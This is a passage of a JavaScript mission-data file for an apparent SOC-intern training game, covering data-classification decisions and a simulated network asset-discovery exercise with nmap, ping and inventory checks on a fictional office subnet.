      {
        id: 'ev_pii_salary', label: 'Employee names and salaries (PII) present in the release set.',
        qualityWeight: 3, source: 'employee_salaries.csv',
        layers: {
          beginner: {
            summary: 'This file has employees'+"'"+' names and how much each person is paid.',
            why: 'Pay and personal details are private — they should never leave the company.',
            prompt: 'Should employee salary information ever be sent to an outside partner?',
          },
          analyst: 'Employee personal data and compensation (PII) found in the outbound release set.',
          technical: 'employee_salaries.csv — name, department, title, annual_salary. HR-Restricted PII + compensation. Classification: Restricted.',
          terms: ['pii'],
        },
      },
      {
        id: 'ev_customer_pii', label: 'Regulated customer payment records present (PCI scope).',
        qualityWeight: 3, source: 'customer_payment_records.csv',
        layers: {
          beginner: {
            summary: 'This file holds customers'+"'"+' card and payment details.',
            why: 'Card and payment data is strictly protected by law — leaking it can mean fines and real harm to customers.',
            prompt: 'What could go wrong if customer payment details were sent outside the company?',
          },
          analyst: 'Customer cardholder data (card last-4, amounts, processor references) — regulated payment records in the release set.',
          technical: 'customer_payment_records.csv — card_last4, amount, processor_ref. Regulated cardholder data (PCI scope). Classification: Restricted.',
          terms: ['pci', 'pii'],
        },
      },
      {
        id: 'ev_confidential_roadmap', label: 'Unannounced acquisition roadmap (material non-public info).',
        qualityWeight: 2, source: 'acquisition_roadmap.txt',
        layers: {
          beginner: {
            summary: 'This is a secret plan about companies CyberCorp might buy.',
            why: 'Unannounced business plans are highly sensitive — sharing them early can break the law and tip off competitors.',
            prompt: 'Should an unannounced business plan be included in a partner release?',
          },
          analyst: 'Draft acquisition roadmap (targets, valuation ranges, timeline) — unannounced, market-sensitive material.',
          technical: 'acquisition_roadmap.txt — PROJECT NORTHSTAR target shortlist + valuation ranges through 2027. Material non-public information. Classification: Confidential.',
          terms: ['materialNonPublic', 'confidential'],
        },
      },
      {
        id: 'ev_contractor_access', label: 'Contractor account read HR/Finance files outside its remit.',
        qualityWeight: 3, source: 'access_log.txt', setFlag: 'contractorAccessDiscovered',
        layers: {
          beginner: {
            summary: 'The outside contractor'+"'"+'s account opened private HR and Finance files in the middle of the night.',
            why: 'An outside account reading files that have nothing to do with its job — at 2 in the morning — is unusual and worth a closer look.',
            prompt: 'Does this look like normal work, or something to flag?',
          },
          analyst: 'Vendor account ext-contractor-07 accessed HR/Finance files (salaries, payment records, roadmap) at ~02:00 — outside its expected scope.',
          technical: 'access_log.txt — ext-contractor-07 read employee_salaries.csv, customer_payment_records.csv, acquisition_roadmap.txt between 02:14–02:21. Vendor account active off-hours, outside its remit.',
          terms: [],
        },
        reflection: {
          title: 'REVIEW THE SUSPICIOUS ACTIVITY',
          prompt: 'What concerns you about this activity? (Tick anything that stands out.)',
          concerns: [
            'An outside contractor account opened private files',
            'The files were opened in the middle of the night',
            'The files were outside the contractor'+"'"+'s normal work',
            'This looks like normal release preparation',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this activity?',
          feedback: 'There is no single right answer here — analysts reason from what they observe. Noticing WHO touched the data, WHEN, and whether it fits their job is exactly the kind of thinking that catches a problem early.',
        },
      },
    ],

    /* ---- DECISION: handling actions (each moves >=3 of 6 resources) ---- */
    actions: [
      {
        id: 'approve_release',
        type: 'direct',
        label: 'Approve Release',
        summary: 'Send the folder to the partner as requested.',
        outcomeSub: 'You authorized the external release.',
        deltas: { complianceExposure: 35, executiveTrust: -20, careerReputation: -15, securityPosture: -25, businessContinuity: 3, organizationBudget: -15000 },
        setFlags: ['sensitiveDataExposed', 'contractorAccessIgnored'],
        consequence: {
          immediate: ['Restricted employee and customer records left the building in the release package.'],
          business: ['Regulatory breach-notification obligations triggered.', 'HR and Legal investigations opened.'],
          future: ['Future missions carry legal and regulatory scrutiny.'],
        },
      },
      {
        id: 'restrict_access',
        type: 'direct',
        label: 'Restrict Access',
        summary: 'Lock the folder down and block the external release.',
        outcomeSub: 'You restricted access to the folder.',
        deltas: { securityPosture: 15, complianceExposure: -10, businessContinuity: -8, careerReputation: 8 },
        setFlags: [],
        consequence: {
          immediate: ['External release halted; sensitive files restricted to authorized roles.'],
          business: ['Partner deliverable delayed pending reclassification. No data exposed.'],
          future: ['A clean handling record strengthens later recommendations.'],
        },
      },
      {
        id: 'recommend_legal',
        type: 'recommendation',
        label: 'Recommend Legal Review',
        summary: 'Ask Legal to review the contractor access and the release.',
        outcomeSub: 'You recommended a legal review.',
        deltas: { complianceExposure: -15, executiveTrust: 8, careerReputation: 10, businessContinuity: -5, organizationBudget: -5000, securityPosture: 6 },
        setFlags: ['legalReviewTriggered'],
        deniedNote: 'Leadership declined the legal review for now; the contractor access remains unreviewed.',
        consequence: {
          immediate: ["Legal engaged to review the contractor's data access and the proposed release."],
          business: ['Release paused pending legal guidance; exposure contained early.'],
          future: ['Legal is now tracking this contractor — useful in later missions.'],
        },
      },
      {
        id: 'archive',
        type: 'direct',
        label: 'Archive',
        summary: 'Archive the folder; cancel the external transfer.',
        outcomeSub: 'You archived the release folder.',
        deltas: { businessContinuity: -3, securityPosture: 6, complianceExposure: -5, careerReputation: 2 },
        setFlags: ['contractorAccessIgnored'],
        consequence: {
          immediate: ['Release folder archived; no external transfer occurred.'],
          business: ['Partner deliverable stalled, but no risk taken.'],
          future: ['Conservative call — safe, if not decisive.'],
        },
      },
      {
        id: 'escalate',
        type: 'recommendation',
        label: 'Escalate',
        summary: 'Escalate to your SOC Lead with your findings.',
        outcomeSub: 'You escalated to leadership.',
        deltas: { executiveTrust: 10, careerReputation: 8, businessContinuity: -2, complianceExposure: -8, securityPosture: 3 },
        setFlags: [],
        deniedNote: 'Leadership sent it back — they want stronger findings before acting.',
        consequence: {
          immediate: ['Escalated to SOC Lead with classification findings and the access-log evidence.'],
          business: ['Senior review engaged; the decision sits with the right authority.'],
          future: ['Acting within your authority builds trust for bigger calls later.'],
        },
      },
    ],

    /* ---- LOCKED AUTHORITY: explain why, offer a recommendation instead ---- */
    lockedActions: [
      {
        id: 'change_policy',
        label: 'Change Data-Handling Policy',
        reason: 'Cybersecurity Interns do not have authority to change data-handling policy. Policy changes require a Security Manager or above.',
        alternativeRecommendationId: 'rec_policy_review',
      },
      {
        id: 'exec_approval',
        label: 'Direct Executive Approval',
        reason: 'Cybersecurity Interns cannot grant executive approvals or engage executives directly. Route this through your SOC Lead.',
        alternativeRecommendationId: 'rec_escalate',
      },
    ],

    /* ---- RECOMMENDATIONS offered as alternatives to locked actions ---- */
    recommendations: {
      rec_policy_review: {
        label: 'Policy Review',
        deltas: { complianceExposure: -8, executiveTrust: 5, careerReputation: 6 },
        setFlags: [],
        deniedNote: 'Leadership declined to open a policy review without stronger evidence.',
        consequence: {
          immediate: ['Policy review requested for contractor data access.'],
          business: ['Data-handling policy gaps flagged to leadership.'],
          future: ['Tighter policy reduces future exposure.'],
        },
      },
      rec_escalate: {
        label: 'Incident Escalation',
        deltas: { executiveTrust: 8, careerReputation: 6, complianceExposure: -6 },
        setFlags: [],
        deniedNote: 'Leadership bounced the escalation back for more detail.',
        consequence: {
          immediate: ['Incident escalated to leadership for an authority decision.'],
          business: ['Senior staff now own the release call.'],
          future: ['Escalation history noted for later missions.'],
        },
      },
    },
  },

  /* ================================================================== *
   * MISSION 2 — Investigate Network Assets (COMMAND-MODEL)
   * Asset discovery on the corporate subnet: find the one device that is
   * not in the inventory, work out what it is and who put it there, and
   * recommend a response. Behavior before terminology — the player runs
   * real commands and reasons from what they see; terms are introduced as
   * glossary chips, never quizzed.
   * ================================================================== */
  'mission-002': {
    id: 'mission-002',
    investigationFeed: true, // Active Investigation Feed (data-driven from discoveryChallenges).
    /* Two-step Analyst Judgment Engine — see Mission 1 for the schema. Authored on
     * existing evidence ids; boardMilestones auto-open the network map once each. */
    caseFileNotebook: true,
    // Pacing beat (shared with Mission 1; see reviewGateMode): show a "read what
    // came up, then continue" step before Sarah's graded call so the just-printed
    // terminal output stays visible. Presentation/sequencing only — never grades.
    reviewBeforeCall: true,
    boardMilestones: ['ev_contractor_device', 'ev_segment', 'ev_probe'],
    // Progressive objectives (engine-level) — tick live as findings/judgments
    // resolve. Presentation-only; computed read-only by objectiveTrackState().
    objectiveTrack: [
      { id: 'm2_discover', label: 'Discover the devices active on the office subnet', doneBy: ['ev:ev_unknown_host'] },
      { id: 'm2_compare',  label: 'Compare them against the approved asset inventory', doneBy: ['ev:ev_not_in_inventory'] },
      { id: 'm2_identify', label: 'Identify the device that is not authorized', doneBy: ['identify'] },
      { id: 'm2_respond',  label: 'Work out what it is, then recommend a response', doneBy: ['decision'] },
    ],
    // APPROVED vs OBSERVED comparison board — revealed once the inventory is read.
    // Presentation-only diff rendered by inventoryBoardHtml(); never scored.
    inventory: {
      title: 'ASSET CHECK \u2014 APPROVED vs OBSERVED',
      revealBy: 'ev_not_in_inventory',
      approvedLabel: 'Approved inventory (asset_inventory.txt)',
      observedLabel: 'Live on subnet (nmap)',
      approved: [
        { ip: '192.168.1.1',  label: 'gateway/router' },
        { ip: '192.168.1.10', label: 'fileserver-apac' },
        { ip: '192.168.1.20', label: 'finance-laptop-apac' },
        { ip: '192.168.1.34', label: 'intern-workstation (you)' },
      ],
      observed: [
        { ip: '192.168.1.1',  label: 'gateway/router',      approved: true },
        { ip: '192.168.1.10', label: 'fileserver-apac',     approved: true },
        { ip: '192.168.1.20', label: 'finance-laptop-apac', approved: true },
        { ip: '192.168.1.34', label: 'your-workstation',    approved: true },
        { ip: '192.168.1.57', label: '(no reverse name)',   approved: false },
      ],
      note: 'Every approved device is live \u2014 plus one extra. 192.168.1.57 is on the network but on no approved list.',
    },
    // Just-in-time concept cards. Triggers are DISJOINT from boardMilestones so a
    // card and the map auto-open never stack. Copy reused from SIM_GLOSSARY.
    conceptCards: [
      { id: 'm2_cc_ip', triggerEv: 'ev_subnet', glossaryKey: 'ipAddress',
        examples: ['Your workstation is 192.168.1.34', 'The "/24" means 192.168.1.0\u2013.255 share this subnet'] },
      { id: 'm2_cc_subnet', triggerEv: 'ev_unknown_host', glossaryKey: 'subnet',
        examples: ['All five hosts answered on 192.168.1.0/24', 'Same subnet \u2192 they can reach each other directly'] },
      { id: 'm2_cc_inventory', triggerEv: 'ev_not_in_inventory', term: 'Asset inventory',
        definition: 'The approved list of every device allowed on the network \u2014 each with its address and owner.',
        why: 'A live device that is not on the inventory is one nobody signed off on. That gap is the first sign of an unmanaged or rogue device.',
        examples: ['asset_inventory.txt lists 4 approved devices', '192.168.1.57 is live but missing from the list'] },
      { id: 'm2_cc_service', triggerEv: 'ev_open_services', glossaryKey: 'service',
        examples: ['22/tcp ssh \u2192 remote login', '445/tcp smb \u2192 file sharing'] },
    ],
    discoveryChallenges: [
      {
        id: 'ch_m2_device', evidenceId: 'ev_contractor_device', short: 'Device ownership', weight: 1,
        observation: {
          prompt: 'You trace the unknown laptop. What stands out about who it belongs to?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It is a contractor\u2019s personal device, barred from internal segments',
              feedback: '"Exactly — an unmanaged personal device on our internal network is the core problem. Good trace." — Sarah Reyes' },
            { id: 'b', label: 'The hostname is auto-generated',
              feedback: '"Hostnames are often auto-generated; that is not the issue. WHO owns it and whether it is allowed here is." — Sarah Reyes' },
            { id: 'c', label: 'It runs a common operating system',
              feedback: '"The OS is not the signal. Focus on the fact that it is a personal device on a restricted segment." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why does a contractor\u2019s personal device on this network matter?',
          correct: 'a',
          options: [
            { id: 'a', label: 'Unmanaged devices bypass our patching, monitoring and policy controls',
              feedback: '"Right — we cannot patch, monitor, or trust a device we do not manage. That is the exposure." — Sarah Reyes' },
            { id: 'b', label: 'Contractors should buy their own laptops',
              feedback: '"Procurement is not the point. The risk is an unmanaged device sitting inside our controls." — Sarah Reyes' },
            { id: 'c', label: 'It might void the contractor\u2019s warranty',
              feedback: '"Their warranty is not our concern. The concern is an uncontrolled device on our network." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_m2_segment', evidenceId: 'ev_segment', short: 'Network placement', weight: 1,
        observation: {
          prompt: 'You check where the device sits. What stands out about its network placement?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It is on the internal CORP segment beside Finance, not guest',
              feedback: '"Yes — placement is everything here. A stranger\u2019s device next to Finance is far worse than one on guest Wi-Fi." — Sarah Reyes' },
            { id: 'b', label: 'It has a private IP address',
              feedback: '"Most internal devices have private IPs. The detail that matters is WHICH segment — it is on CORP, beside Finance." — Sarah Reyes' },
            { id: 'c', label: 'It connected during the afternoon',
              feedback: '"Connection time is minor here. The placement on the internal Finance segment is what stands out." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why does sitting on the internal Finance segment matter?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It gives the device a direct path to sensitive Finance systems',
              feedback: '"Exactly — guest isolation would have contained it. On CORP it can reach the crown jewels." — Sarah Reyes' },
            { id: 'b', label: 'Internal IPs are harder to remember',
              feedback: '"That is not a security concern. The point is the device has line of sight to Finance data." — Sarah Reyes' },
            { id: 'c', label: 'Guest Wi-Fi is usually slower',
              feedback: '"Speed is irrelevant. The risk is the internal placement giving access to Finance." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_m2_probe', evidenceId: 'ev_probe', short: 'Device behaviour', weight: 2,
        observation: {
          prompt: 'You review the device\u2019s traffic. What stands out about its behaviour?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It has repeatedly tried to reach the Finance file share',
              feedback: '"That is the tell — repeated reach for Finance data is intent, not an idle device." — Sarah Reyes' },
            { id: 'b', label: 'It sends occasional DNS lookups',
              feedback: '"Every device does DNS. The standout is the repeated probing of the Finance share." — Sarah Reyes' },
            { id: 'c', label: 'It has been online for several hours',
              feedback: '"Uptime alone is not suspicious. The repeated Finance-share attempts are." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'How should you judge this device\u2019s activity?',
          correct: 'suspicious',
          options: [
            { id: 'suspicious', label: 'Suspicious — an unauthorized device actively probing Finance; escalate and contain',
              feedback: '"Right call. Unauthorized plus actively reaching for Finance data is escalate-and-contain territory." — Sarah Reyes' },
            { id: 'benign', label: 'Benign — it is probably just auto-discovery',
              feedback: '"I would challenge that. Auto-discovery does not repeatedly target a Finance file share." — Sarah Reyes' },
            { id: 'malicious', label: 'Malicious — confirmed breach, pull every cable now',
              feedback: '"Take it seriously, yes, but we have not proven a breach. Call it Suspicious, contain, and investigate." — Sarah Reyes' },
          ],
        },
      },
    ],
    opId: 'OPS-2026-002',
    severity: 'MEDIUM',
    region: 'APAC REGION',
    title: 'Investigate Network Assets',
    threatClass: 'Network Fundamentals & Asset Discovery',
    priority: 'P3 — MEDIUM',
    promptLabel: 'intern@cybercorp:~/netops$',
    carryFlags: [
      { key: 'rogueDeviceActive',     label: 'Unapproved device left active on the network' },
      { key: 'rogueDeviceContained',  label: 'Unapproved device disconnected / contained' },
      { key: 'contractorDeviceLinked', label: 'Unapproved device linked to a contractor' },
    ],
    supervisorMemory: [
      { when: { allOf: ['legalReviewTriggered'] }, tone: 'good',
        text: "Looping Legal in on that contractor in your first case was the right call — that paper trail is already paying off. Bring the same instinct here." },
      { when: { allOf: ['sensitiveDataExposed'] }, tone: 'bad',
        text: "We're still cleaning up the records that left the building on your first case. Be deliberate this time — no second incident." },
      { when: { allOf: ['contractorAccessIgnored'], noneOf: ['legalReviewTriggered'] }, tone: 'warn',
        text: "The contractor access from your first case never got a real review. If that thread resurfaces here, don't let it slide twice." },
      { when: { noneOf: ['legalReviewTriggered', 'sensitiveDataExposed', 'contractorAccessIgnored'] }, tone: 'good',
        text: "Clean handling on the release review last case. Keep that standard here." },
    ],
    notebook: {
      facts: [
        { label: 'An unknown host is live on the corporate network.', confirmedBy: ['ev_unknown_host', 'ev_host_live'] },
        { label: 'The device is not listed in the asset inventory.', confirmedBy: ['ev_not_in_inventory'] },
        { label: 'The device sits on the internal Finance segment, not guest.', confirmedBy: ['ev_segment'] },
        { label: 'The device has been reaching for Finance data.', confirmedBy: ['ev_probe', 'ev_open_services'] },
      ],
      hypotheses: [
        { label: 'The unknown host on the CORP segment is an unauthorized device, not a sanctioned asset.', triggeredBy: ['ev_unknown_host', 'ev_not_in_inventory'] },
        { label: 'The device belongs to the contractor already flagged in the release case.', triggeredBy: ['ev_notes_contractor', 'ev_contractor_device'] },
        { label: 'The device is actively reaching for Finance data, not sitting idle.', triggeredBy: ['ev_probe', 'ev_open_services'] },
      ],
      unknowns: [
        { label: 'Is the unknown host actually live on the network right now?', resolvedBy: ['ev_host_live'] },
        { label: 'Who owns the device, and are they authorized to be here?', resolvedBy: ['ev_contractor_device', 'ev_lease'] },
        { label: 'Is it on the internal CORP segment or isolated on guest?', resolvedBy: ['ev_segment'] },
      ],
      recommendations: [
        { label: 'Disconnect and contain the unapproved device.', doneBy: ['rogueDeviceContained'] },
        { label: 'Link the device to its contractor owner.', doneBy: ['contractorDeviceLinked'] },
      ],
    },
    evidenceEmpty: 'No evidence yet. Use the terminal to map the network — each command can surface a new finding.',
    risks: [
      { id: 'risk_unknown_device',   label: 'An unapproved device is connected to the corporate network', triggeredBy: ['ev_unknown_host', 'ev_not_in_inventory'] },
      { id: 'risk_services_open',    label: 'The unknown device is running open network services', triggeredBy: ['ev_open_services'] },
      { id: 'risk_sensitive_segment',label: 'The device sits on the internal finance segment, not guest', triggeredBy: ['ev_segment'] },
      { id: 'risk_finance_probe',    label: 'The device has been reaching for the finance file share', triggeredBy: ['ev_probe'] },
      { id: 'risk_contractor_device',label: 'A contractor connected a personal, unmanaged device', triggeredBy: ['ev_contractor_device'] },
    ],
    identify: {
      head: 'YOUR DETERMINATION',
      prompt: 'Which device is the unapproved one that does not belong on this network?',
      reviewLabel: 'Unapproved device',
      note: 'Determination recorded — this is the device your recommendation will act on.',
      correctId: 'dev_57',
      options: [
        { id: 'dev_10', label: '192.168.1.10 — file server (in inventory)' },
        { id: 'dev_20', label: '192.168.1.20 — finance laptop (in inventory)' },
        { id: 'dev_34', label: '192.168.1.34 — your workstation' },
        { id: 'dev_57', label: '192.168.1.57 — unknown host' },
      ],
    },

    // Reactive device map (Task #94) — review-only. Nodes/links start hidden or
    // neutral and reveal/flag as the terminal surfaces evidence. Nothing here is
    // persisted or scored; `dev_57` only turns "suspicious" once the player has
    // actually surfaced the evidence that proves it (behaviour before terminology).
    map: {
      cap: 'CORP SEGMENT · 192.168.1.0/24 — APAC OFFICE',
      hint: 'Every device is mapped. Red marks the unapproved host and what it has been reaching for. Select any node or connection for analyst intel.',
      nodes: {
        gateway: {
          x: 50, y: 14, glyph: '🔀', label: '192.168.1.1', sub: 'gateway / router', seed: true,
          intel: {
            what: 'The office router that ties every device on the 192.168.1.0/24 subnet together.',
            technique: 'Read your own interface config (ip addr) to learn the subnet and its gateway.',
            why: 'Everything on this subnet routes through here — it defines who can reach whom.' },
        },
        you: {
          x: 16, y: 46, glyph: '💻', label: '192.168.1.34', sub: 'your workstation', seed: true, status: 'self',
          identifyAs: 'dev_34',
          intel: {
            what: 'Your own SOC analyst workstation — an approved, inventoried device.',
            technique: 'ip addr shows your address and confirms which subnet you are investigating from.',
            why: 'Knowing your own position is the anchor point for mapping everything else.' },
        },
        fileserver: {
          x: 36, y: 84, glyph: '🗄️', label: '192.168.1.10', sub: 'file server',
          revealBy: 'ev_unknown_host', statusBy: { ev_probe: 'target' }, identifyAs: 'dev_10',
          intel: {
            what: 'The APAC file server — an approved, inventoried device holding shared files.',
            technique: 'A subnet scan (nmap 192.168.1.0/24) lists it; the asset inventory confirms it is approved.',
            why: 'It is a sensitive asset. If an unapproved device is reaching for it, that matters.' },
        },
        finance: {
          x: 64, y: 84, glyph: '💰', label: '192.168.1.20', sub: 'finance laptop',
          revealBy: 'ev_unknown_host', statusBy: { ev_probe: 'target' }, identifyAs: 'dev_20',
          intel: {
            what: 'The finance laptop — an approved device that handles sensitive financial data.',
            technique: 'Discovered by the subnet scan and confirmed against the approved asset inventory.',
            why: 'Finance data is a prime target. Watch what tries to connect to it.' },
        },
        unknown: {
          x: 86, y: 48, glyph: '❓', label: '192.168.1.57', sub: 'unidentified host',
          revealBy: 'ev_unknown_host', status: 'unknown', statusBy: { ev_not_in_inventory: 'suspicious' }, identifyAs: 'dev_57',
          // Cross-case "red string": the same contractor (J. Demir) recurs across
          // your cases. Presentation-only — the timeline is authored, not scored.
          redString: {
            entity: 'J. Demir — external contractor (ext-07)',
            note: 'The same contractor keeps surfacing across your cases. The thread is still open.',
            timeline: [
              { op: 'OPS-2026-001 · Release Review', where: 'Contractor account read HR & Finance records outside its remit.' },
              { op: 'OPS-2026-002 · Network Assets', where: 'Personal laptop (192.168.1.57) on the internal segment, reaching for Finance.' },
            ],
          },
          intel: {
            what: 'An extra host with no reverse name that is not on the approved inventory — later traced to contractor J. Demir\u2019s personal laptop.',
            technique: 'Cross-reference the scan against the inventory, then pivot through DHCP leases and contractor records to attribute it.',
            why: 'An unapproved, unmanaged device on the internal segment — reaching for finance shares — is the core of this incident.' },
        },
        // OPTIONAL SIDE-TRAIL node — pinned only after the player traces the
        // "printer that wakes at 3 a.m." lead (board flag sideTrailBoard:st_m2_vlan).
        vlan99: {
          x: 16, y: 82, glyph: '🕳️', label: 'VLAN 99', sub: 'undocumented segment',
          sideTrailReveal: 'st_m2_vlan', status: 'suspicious',
          intel: {
            what: 'A management VLAN (802.1q tag 99) that appears on no network diagram, surfaced by tracing a printer\u2019s overnight traffic.',
            technique: 'Optional side-trail: cross-read the DHCP leases against the documented VLAN list.',
            why: 'Undocumented segments are unmonitored. Even a printer quietly reaching one is a path worth knowing about.' },
        },
      },
      links: [
        { a: 'you', b: 'gateway', revealBy: 'ev_subnet',
          intel: {
            what: 'Your workstation sits on the 192.168.1.0/24 subnet through this gateway.',
            technique: 'ip addr reveals your address and subnet mask.',
            why: 'It establishes the shared network every other device also lives on.' } },
        { a: 'fileserver', b: 'gateway', revealBy: 'ev_unknown_host',
          intel: {
            what: 'The file server is live on the same subnet.',
            technique: 'Subnet sweep (nmap 192.168.1.0/24).',
            why: 'Confirms a sensitive asset shares the segment with every other host.' } },
        { a: 'finance', b: 'gateway', revealBy: 'ev_unknown_host',
          intel: {
            what: 'The finance laptop is live on the same subnet.',
            technique: 'Subnet sweep (nmap 192.168.1.0/24).',
            why: 'Another sensitive asset on the shared segment.' } },
        { a: 'unknown', b: 'gateway', revealBy: 'ev_unknown_host',
          intel: {
            what: 'The unidentified host is on the same internal subnet as everything else.',
            technique: 'Subnet sweep (nmap 192.168.1.0/24).',
            why: 'Same-subnet reachability means it can attempt to reach the file server and finance laptop directly.' } },
        { a: 'unknown', b: 'fileserver', revealBy: 'ev_probe', danger: true,
          intel: {
            what: 'Repeated connection attempts from .57 to the file server\u2019s file-sharing port (445), all denied.',
            technique: 'Read the network event log (tail network_events.log).',
            why: 'An unapproved device actively probing a sensitive share is scouting for a way in, not idle presence.' } },
        { a: 'unknown', b: 'finance', revealBy: 'ev_probe', danger: true,
          intel: {
            what: 'Repeated connection attempts from .57 to the finance laptop\u2019s file-sharing port (445), all denied.',
            technique: 'Read the network event log (tail network_events.log).',
            why: 'Reaching specifically for finance assets sharpens the device from "unapproved" to "concerning".' } },
        // OPTIONAL SIDE-TRAIL link — appears with the VLAN 99 node once traced.
        { a: 'gateway', b: 'vlan99', sideTrailReveal: 'st_m2_vlan',
          intel: {
            what: 'An 802.1q trunk carrying VLAN 99 traffic between the gateway and an undocumented segment.',
            technique: 'Revealed by tracing the optional printer side-trail.',
            why: 'Connects the documented network to a segment nobody is monitoring.' } },
      ],
    },

    // OPTIONAL SIDE-TRAILS (presentation-only). Never gate progression and never
    // touch scoring or Investigation Confidence. Tracing one pins a permanent
    // node to the Case Board (the VLAN 99 node + link above).
    sideTrails: [
      {
        id: 'st_m2_vlan',
        tag: 'OBSERVATION',
        minutes: '~90 sec',
        title: 'The printer that wakes at 3 a.m.',
        teaser: 'A back-office printer keeps powering up overnight to talk to a VLAN that is on no network diagram.',
        trigger: 'ev_subnet',
        mentor: 'Field note',
        artifacts: [
          { label: 'dhcp_leases.txt — overnight fragment', lines: [
            '03:02  192.168.1.40  MFP-APAC-03 (printer)   lease renew',
            '03:02  request  vlan99.mgmt  (802.1q tag 99)',
            '# no other office device tags VLAN 99',
          ] },
          { label: 'IT ticket #4471 (closed — "cannot reproduce")', lines: [
            '"Printer drops off Wi-Fi at night, comes back by morning."',
            'Resolution: closed, no fault found. No follow-up.',
          ] },
        ],
        observation: {
          prompt: 'A printer is tagging traffic for VLAN 99 — a segment no diagram documents. What stands out?',
          correct: 'a',
          options: [
            { id: 'a', label: 'An everyday device is quietly using an undocumented network segment',
              feedback: 'Exactly — VLAN 99 is on no diagram, yet a printer reaches it nightly. Undocumented segments are where shadow IT hides.' },
            { id: 'b', label: 'Printers are simply noisy on the network',
              feedback: 'Noise alone is not the signal. The standout is that the segment it talks to does not officially exist.' },
            { id: 'c', label: 'The lease renewed at an unusual hour',
              feedback: 'Odd hours are a hint, not the point. What matters is the destination — a VLAN nobody documented.' },
          ],
        },
        justification: {
          prompt: 'Why does an undocumented VLAN tied to a forgotten device matter?',
          correct: 'a',
          options: [
            { id: 'a', label: 'Undocumented segments escape monitoring and can quietly bridge trusted and untrusted zones',
              feedback: 'Right — what is not on the map is not being watched. That is how a printer becomes a pivot. Logged to the Case Board.' },
            { id: 'b', label: 'Printers waste toner when left on overnight',
              feedback: 'Cost is not the security concern. The risk is an unmonitored path between segments.' },
            { id: 'c', label: 'It breaches the printer\u2019s warranty terms',
              feedback: 'Warranty is not our worry. An invisible network segment is.' },
          ],
        },
        resolveNote: 'You traced MFP-APAC-03 to an undocumented management VLAN (99) — shadow IT left behind by a long-closed ticket. Not part of today\u2019s incident, but now it is on the board.',
        reward: {
          board: 'st_m2_vlan',
          boardNote: 'A new node — VLAN 99 (undocumented) — is pinned to your Case Board, linked to the office gateway. Open the Network Map to see it.',
        },
      },
    ],

    // END-OF-MISSION FORESHADOWING (presentation-only) — a short diegetic artifact
    // that seeds a question for the next assignment (Reconnaissance Detection).
    foreshadow: {
      kind: 'RECOVERED — INTERNAL CHAT FRAGMENT',
      title: 'Two lines pulled from an archived #it-helpdesk thread',
      lines: [
        '08:14  j.demir(ext):  hey can you reset my CyberCorp login? locked out again',
        '08:15  helpdesk:      sent a reset link to your personal email — check there',
      ],
      primes: 'Next case: when a reset link lands in a personal inbox, who really controls the account?',
    },

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Network Asset Review', c: 'head' },
      { t: 'A monitoring alert says a device on the office network does not match the', c: 'dim' },
      { t: 'asset inventory. Map the network, find the odd one out, and decide what to do.', c: 'dim' },
      { t: 'Type  ip addr  to see your own address, then  help  for the full command list.', c: 'dim' },
    ],
    brief: {
      situation:
        'The APAC office network threw a low-priority alert: the count of active ' +
        'devices is higher than the approved asset inventory. Probably nothing — a ' +
        'phone, a test box. But "probably nothing" is still worth ten minutes. Map ' +
        'what is actually on the network, compare it to what is supposed to be there, ' +
        'and figure out the device that does not belong.',
      objectives: [
        'Discover the devices active on the office subnet',
        'Compare them against the approved asset inventory',
        'Identify the device that is not authorized',
        'Work out what it is and who connected it — then recommend a response',
      ],
      managerNote:
        '"Network housekeeping, mostly. But you remember that contractor from the data ' +
        'review? Keep your eyes open — unknown hardware on an internal segment is how ' +
        'small problems get big. Recommend, don'+"'"+'t reconfigure. — Sarah Reyes, SOC Lead"',
    },

    commandBriefs: true,  // Guided Terminal: brief each NEW tool (ip/nmap/ping/grep/tail) once
    commands: [
      {
        id: 'ip_addr',
        match: ['ip addr', 'ipaddr', 'ifconfig'],
        help: 'show your own machine'+"'"+'s network address',
        core: true,
        output: [
          { t: 'eth0:  inet 192.168.1.34/24  brd 192.168.1.255', c: 'file' },
          'You are host 192.168.1.34 on subnet 192.168.1.0/24 (the office LAN).',
        ],
        reveals: ['ev_subnet'],
        observation: 'You and every office device share the 192.168.1.0/24 subnet — they can all reach each other.',
        question: 'If a stranger'+"'"+'s device joined this same subnet, what could it reach?',
        next: 'scan the whole subnet to see who else is online — type  nmap 192.168.1.0/24',
      },
      {
        id: 'nmap_subnet',
        match: ['nmap 192.168.1.0/24', 'nmap subnet', 'nmap 192.168.1.0'],
        help: 'scan the subnet to discover active devices',
        core: true,
        output: [
          { t: 'Nmap scan report — 192.168.1.0/24  (5 hosts up)', c: 'head' },
          '  192.168.1.1    up    gateway/router',
          '  192.168.1.10   up    fileserver-apac',
          '  192.168.1.20   up    finance-laptop-apac',
          '  192.168.1.34   up    your-workstation',
          '  192.168.1.57   up    (no reverse name)',
        ],
        reveals: ['ev_unknown_host'],
        observation: '192.168.1.57 answers, but unlike the others it has no recognizable name.',
        question: 'Four hosts you can name, one you cannot — which one deserves a closer look?',
        next: 'check it against the official list — type  cat asset_inventory.txt',
      },
      {
        id: 'asset_inventory',
        match: ['cat asset_inventory.txt', 'cat asset_inventory', 'less asset_inventory.txt'],
        help: 'read the approved device inventory',
        core: true,
        output: [
          { t: 'asset_inventory.txt — APPROVED DEVICES (APAC office)', c: 'head' },
          '  192.168.1.1    gateway/router        IT',
          '  192.168.1.10   fileserver-apac       IT',
          '  192.168.1.20   finance-laptop-apac   Finance',
          '  192.168.1.34   intern-workstation    SOC (you)',
          '  # Every approved device is listed here. Nothing else should be online.',
        ],
        reveals: ['ev_not_in_inventory'],
        observation: '192.168.1.57 is NOT in the approved inventory — every other live host is.',
        question: 'A device on the network that nobody approved — is that a mistake, or something more?',
        next: 'confirm it is really there and reachable — type  ping 192.168.1.57',
      },
      {
        id: 'ping_57',
        match: ['ping 192.168.1.57', 'ping 57'],
        help: 'check whether the unknown host is alive',
        output: [
          '64 bytes from 192.168.1.57: icmp_seq=1 ttl=64 time=0.8 ms',
